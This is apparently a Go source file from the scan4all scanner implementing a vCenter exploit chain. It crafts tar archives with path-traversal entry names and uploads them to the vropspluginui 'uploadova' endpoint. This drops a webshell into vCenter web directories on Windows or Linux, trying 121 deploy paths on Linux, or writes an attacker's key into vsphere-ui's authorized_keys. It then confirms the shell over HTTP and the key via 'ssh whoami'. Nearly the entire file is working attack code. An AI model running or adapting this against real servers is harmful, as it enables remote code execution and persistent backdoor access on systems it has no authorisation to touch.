package vCenter

import (
	"archive/tar"
	"bytes"
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"github.com/hktalent/PipelineHttp"
	"io"
	"log"
	"net/http"
	"os/exec"
	"strconv"
	"strings"
)

func Generate_tar(name string, o_name string, step string) bytes.Buffer {
	// create a buffer to store the compressed file content
	var buf bytes.Buffer
	// create an archive
	tw := tar.NewWriter(&buf)
	// define a bunch of files
	// write the files into the archive tw
	tar_file_name := ""
	// filename := ""
	if o_name == "windows" {
		tar_file_name = "../../../../../ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/" + util.WebShellName
		// filename = "win.tar"

	} else if o_name == "ssh" {
		tar_file_name = "../../../../../home/vsphere-ui/.ssh/authorized_keys"
		// filename = "cron.tar"
	} else {
		tar_file_name = strings.Replace("../../../../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/qq/0/h5ngc.war/resources/", "qq", step, 1) + util.WebShellName
		// filename = "linux.tar"
	}
	var files = []struct {
		Name, Body string
	}{
		{tar_file_name, string(name)},
	}
	//fmt.Println(tar_file_name)
	for _, file := range files {
		hdr := &tar.Header{
			Name: file.Name,
			Mode: 0600,
			Size: int64(len(file.Body)),
		}
		if err := tw.WriteHeader(hdr); err != nil {
			log.Println(err)
			return buf
		}
		if _, err := tw.Write([]byte(file.Body)); err != nil {
			log.Println(err)
			return buf
		}
	}
	if err := tw.Close(); err != nil {
		log.Println(err)
		return buf
	}

	// // write the compressed content into the file file.tar.gz
	// f, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY, 0666)
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// buf.WriteString("qq")
	// ss := buf.String()
	// q, err := os.OpenFile("new"+filename, os.O_CREATE|os.O_WRONLY, 0666)
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// q.WriteString(ss)
	// a := io.ByteReader(buf)
	// buf.WriteTo(f)
	// fmt.Println(buf.Bytes())
	return buf

}

func Upload_shell2(szUrl string, buf bytes.Buffer) (string, bool) {
	szUrl = util.GetUrlHost(szUrl)
	szRst := ""
	szUrl = szUrl + "/ui/vropspluginui/rest/services/uploadova"
	c1 := util.GetClient(szUrl)
	c1.SendFiles(c1.Client, szUrl, nil, &[]PipelineHttp.PostFileData{PipelineHttp.PostFileData{
		ContentType: "application/json;charset=UTF-8",
		Name:        "uploadFile",
		FileName:    util.GeneratorId(5) + ".tar",
		FileData:    bytes.NewReader(buf.Bytes()),
	}}, func(resp *http.Response, err error, szU string) {
		if nil != resp {
			if data, err := io.ReadAll(resp.Body); nil != err {
				if strings.Contains(string(data), "SUCCESS") {
					szRst = szU
				}
			}
			if resp.StatusCode == 200 {
				fmt.Println("[+] Upload successful, starting command execution.")
			}
		}
	}, func() map[string]string {
		m1 := map[string]string{
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
		}
		return m1
	})
	return szRst, "" != szRst
}

func Upload_windows_shell(szUrl, tar_content string) string {
	buffer := Generate_tar(tar_content, "windows", "?")
	if szRst, ok := Upload_shell2(szUrl, buffer); ok {
		log.Println("start test ", szRst)
		return Check_shell(szUrl, "windows")
	}
	return ""
}

func Upload_linux_shell(url, tar_content string) string {
	for i := 1; i <= 121; i++ {
		buffer := Generate_tar(tar_content, "linux", strconv.Itoa(i))
		if szRst, ok := Upload_shell2(url, buffer); ok {
			log.Println("start test ", szRst)
			return Check_shell(url, "linux")
			break
		}
	}
	return ""
}

func Upload_ssh_authorized_keys(szUrl, tar_content string) string {
	buffer := Generate_tar(tar_content, "ssh", "?")
	s1 := util.GetUrlHost(szUrl)
	if szRst, ok := Upload_shell2(szUrl, buffer); ok {
		log.Println("start test ", szRst)
		szCmd := "vsphere-ui@" + strings.Split(s1, ":")[0]
		cmd := exec.Command("ssh", szCmd, "whoami")
		if output, err := cmd.Output(); nil == err {
			res := strings.Replace((string(output)), "\n", "", 1)
			if res == "vsphere-ui" {
				s1 = "Upload successful: ssh " + szCmd
				log.Println(s1)
				return s1
			}
		}
	}
	return ""
}

func Check_shell(szUrl string, os_name string) string {
	szUrl = util.GetUrlHost(szUrl)
	shell_url := ""
	if os_name == "windows" {
		shell_url = szUrl + "/statsreport/" + util.WebShellName
	} else if os_name == "linux" {
		shell_url = szUrl + "/ui/resources/" + util.WebShellName
	}
	if "" == shell_url {
		return ""
	}
	util.SendData2Url(shell_url, "", &map[string]string{
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
	}, func(resp *http.Response, err error, szU string) {
		if nil != resp {
			if resp.StatusCode == 200 {
				shell_url = szU
				fmt.Println("[+] Upload successful, starting command execution.")
			}
			io.Copy(io.Discard, resp.Body)
		} else {
			shell_url = ""
		}
	})
	return shell_url
}

func CheckVul003(szUrl string) (string, bool) {
	var szRst string
	if szRst = Upload_windows_shell(szUrl, util.X3Webshell); "" != szRst {
		return szRst, "" != szRst
	} else if szRst = Upload_linux_shell(szUrl, util.X3Webshell); "" != szRst {
		return szRst, "" != szRst
	}
	szRst = Upload_ssh_authorized_keys(szUrl, util.Authorized_keys)
	return szRst, "" != szRst
}
